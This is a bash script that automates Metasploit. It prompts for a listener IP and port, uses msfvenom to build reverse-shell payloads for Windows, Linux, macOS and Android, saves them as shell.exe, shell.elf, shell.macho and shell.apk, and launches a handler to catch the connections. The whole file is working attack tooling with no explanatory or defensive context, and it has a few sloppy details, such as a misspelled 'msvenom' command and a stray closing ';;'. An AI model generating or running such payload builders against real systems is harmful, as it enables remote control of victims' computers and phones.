#!/bin/bash
[[ `id -u` -eq 0 ]] || { echo -e "Must be root to run script"; exit 1; }
#resize -s 30 60                                   
SERVICE=service;
if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/temp 
read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
options=("win" "nix" "mac" "droid" "listall" "exit")
select opt in "${options[@]}"
do
    case $opt in
        "win")
			mainpayload=windows/meterpreter/reverse_tcp
            msfvenom -p $mainpayload LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "mshell.exe saved to ~/Desktop/temp"
			touch ~/Desktop/temp/meterpreter.rc
			echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
			echo set PAYLOAD $mainpayload >> ~/Desktop/temp/meterpreter.rc
			echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
			echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
			echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
			echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
			cat ~/Desktop/temp/meterpreter.rc
			msfconsole -r ~/Desktop/temp/meterpreter.rc
            ;;
        "nix")
			mainpayload=linux/x86/meterpreter/reverse_tcp
            msfvenom -p $mainpayload LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "mshell.elf saved to ~/Desktop/temp"
			touch ~/Desktop/temp/meterpreter.rc
			echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
			echo set PAYLOAD $mainpayload >> ~/Desktop/temp/meterpreter.rc
			echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
			echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
			echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
			echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
			cat ~/Desktop/temp/meterpreter.rc
			msfconsole -r ~/Desktop/temp/meterpreter.rc
            ;;
        "mac")
			mainpayload=osx/x86/shell_reverse_tcp
            msfvenom -p $mainpayload LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "mshell.macho saved to ~/Desktop/temp"
			touch ~/Desktop/temp/meterpreter.rc
			echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
			echo set PAYLOAD $mainpayload >> ~/Desktop/temp/meterpreter.rc
			echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
			echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
			echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
			echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
			cat ~/Desktop/temp/meterpreter.rc
			msfconsole -r ~/Desktop/temp/meterpreter.rc
            ;;
        "droid")
			mainpayload=android/meterpreter/reverse_tcp
            msfvenom -p $mainpayload LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "mshell.apk saved to ~/Desktop/temp"
			touch ~/Desktop/temp/meterpreter.rc
			echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
			echo set PAYLOAD $mainpayload >> ~/Desktop/temp/meterpreter.rc
			echo set LHOST $uservar >> ~/Desktop/temp/meterpreter.rc
			echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
			echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
			echo exploit -j -z >> ~/Desktop/temp/meterpreter.rc
			cat ~/Desktop/temp/meterpreter.rc
			msfconsole -r ~/Desktop/temp/meterpreter.rc
            ;;  
        "listall")
            xterm -e msvenom -l &
            ;;   
        "exit")
            echo "Good Bye" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;
